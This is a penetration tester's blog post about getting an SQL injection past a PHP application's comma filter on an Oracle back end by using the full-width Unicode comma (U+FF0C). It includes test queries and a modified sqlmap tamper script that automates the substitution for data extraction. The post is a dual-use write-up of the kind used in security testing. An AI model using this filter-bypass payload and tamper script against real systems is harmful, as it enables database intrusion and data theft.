---
layout: post
title: SQL injection, Oracle and full-width characters
canonical_url: https://medium.com/@Wflki/sql-injection-oracle-and-full-width-characters-13bb86fc034a?source=rss-6916f6b61f10------2
tag:
- sql-injection
- appsec
- oracle
- infosec
---

<p>Despite the fact that SQL injection is relatively old and solved problem, it is still commonly found in web applications.</p><p>During one pentest I faced PHP application, which was vulnerable to SQL injection, but exploitation was kinda tricky, since it was replacing comma with part of additional SQL query. So every time you send <strong>,</strong> in your SQL payload, it gets replaced to something like OR like ‘%blabla%’ and breaks your appended query’s syntax. Since I was not aware how to reliably extract data from Oracle database without using commas (since Oracle does not have LIMIT clause, you have to use ROWNUM which requires commas) I decided to try Unicode symbols with the hope that vulnerable PHP application will not recognize such symbols but it will be accepted by Oracle database as regular comma. After a quick googling I found a nice website, which showed me all characters with COMMA in character name together with UTF-8 representations.</p><p><a href="http://unicode-search.net/unicode-namesearch.pl?term=COMMA">Searching in Unicode character names for COMMA</a></p><figure><img alt="" src="https://cdn-images-1.medium.com/max/901/1*H1PuSYIS5kF12JsI4ojhow.png" /></figure><p>First, I was looking for characters that visibly looks like regular comma. After a few tries it turned out that <strong>FULL-WIDTH COMMA</strong> perfectly works in this case — PHP application does not treat it as a comma (it does not get replaced), but works fine for Oracle database as legitimate part of SQL syntax. Voila.</p><blockquote>Unicode code point/Character/UTF-8 encoding (hex)/Unicode character name <br>U+FF0C/，/ef bc 8c/FULLWIDTH COM­MA</blockquote><p>It is quite rare to have Oracle database outside corporate environment. So, for playing more with it and confirm that Oracle database really treats full-width UTF-8 characters as valid syntax and it is not some PHP application behavior, I was planning to play with it on <a href="http://sqlfiddle.com/">SQLFiddle</a>. Turns out that <a href="http://sqlfiddle.com/">SQLFiddl</a>e is no longer working with Oracle database. Luckily, Oracle has a free service called <a href="https://livesql.oracle.com">Oracle Live SQL</a>, which is basically the same as SQLFiddle — it allows to access Oracle database via web interface.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/668/1*1YqTrFlT3sy9CvOtNupZhg.png" /><figcaption>Executing SQL query on Oracle Live SQL</figcaption></figure><p>Replacing regular comma (below) with full-width variant gives the same results as shown in a picture above.</p><blockquote>SELECT OWNER，PRIVILEGE FROM user_tab_privs;</blockquote><p>Meanwhile, passing any other representation of comma gives error (e.g. small comma — U+FE50). The following query:</p><blockquote>SELECT OWNER﹐PRIVILEGE FROM user_tab_privs;</blockquote><p>Results in :</p><blockquote>ORA-00911: invalid character</blockquote><p>To automate exploitation using SQLMAP I had to instruct SQLMAP to replace regular commas to full-width commas, which can be achieved using tamper scripts. Luckily for me, there is already a very similar tamper script that is replacing regular quote to full-width quote named <a href="https://github.com/sqlmapproject/sqlmap/blob/master/tamper/apostrophemask.py"><em>apostrophemask.py</em></a>.</p><blockquote>#!/usr/bin/env python</blockquote><blockquote>“””<br>Copyright © 2006–2017 sqlmap developers (<a href="http://sqlmap.org/">http://sqlmap.org/</a>)<br>See the file ‘doc/COPYING’ for copying permission<br>“””</blockquote><blockquote>from lib.core.enums import PRIORITY</blockquote><blockquote>__priority__ = PRIORITY.LOWEST</blockquote><blockquote>def dependencies():<br> pass</blockquote><blockquote>def tamper(payload, **kwargs):<br> “””<br> Replaces apostrophe character with its UTF-8 full width counterpart</blockquote><blockquote>References:<br> * <a href="http://www.utf8-chartable.de/unicode-utf8-table.pl?start=65280&amp;number=128">http://www.utf8-chartable.de/unicode-utf8-table.pl?start=65280&amp;number=128</a><br> * <a href="http://lukasz.pilorz.net/testy/unicode_conversion/">http://lukasz.pilorz.net/testy/unicode_conversion/</a><br> * <a href="http://sla.ckers.org/forum/read.php?13,11562,11850">http://sla.ckers.org/forum/read.php?13,11562,11850</a><br> * <a href="http://lukasz.pilorz.net/testy/full_width_utf/index.phps">http://lukasz.pilorz.net/testy/full_width_utf/index.phps</a></blockquote><blockquote>&gt;&gt;&gt; tamper(“1 AND ‘1’=’1”)<br> ‘1 AND %EF%BC%871%EF%BC%87=%EF%BC%871’<br> “””</blockquote><blockquote>return payload.replace(‘\’’, “%EF%BC%87”) if payload else payload</blockquote><p>I quickly made slightly changes and was able to automate data extraction using SQLMAP.</p><blockquote>#!/usr/bin/env python</blockquote><blockquote>“””<br>Copyright © 2006–2017 sqlmap developers (<a href="http://sqlmap.org/">http://sqlmap.org/</a>)<br>See the file ‘doc/COPYING’ for copying permission<br>“””</blockquote><blockquote>from lib.core.enums import PRIORITY</blockquote><blockquote>__priority__ = PRIORITY.LOWEST</blockquote><blockquote>def dependencies():<br> pass</blockquote><blockquote>def tamper(payload, **kwargs):<br> “””<br> Replaces comma character with its UTF-8 full width counterpart<br> “””</blockquote><blockquote>return payload.replace(‘,’, “<strong>%EF%BC%8C</strong>”) if payload else payload</blockquote><p>As you can see, bypassing security filters using Unicode characters is not new, but still an effective technique. Oracle also accepts full-width commas and, most likely, other characters. Thus, don’t forget to update your payloads lists with such characters.</p><p>P.S. Oracle Live SQL runs on Oracle Database 12c Enterprise Edition Release 12.2.0.1.0–64bit.</p><img src="https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=13bb86fc034a" width="1" height="1" alt="">
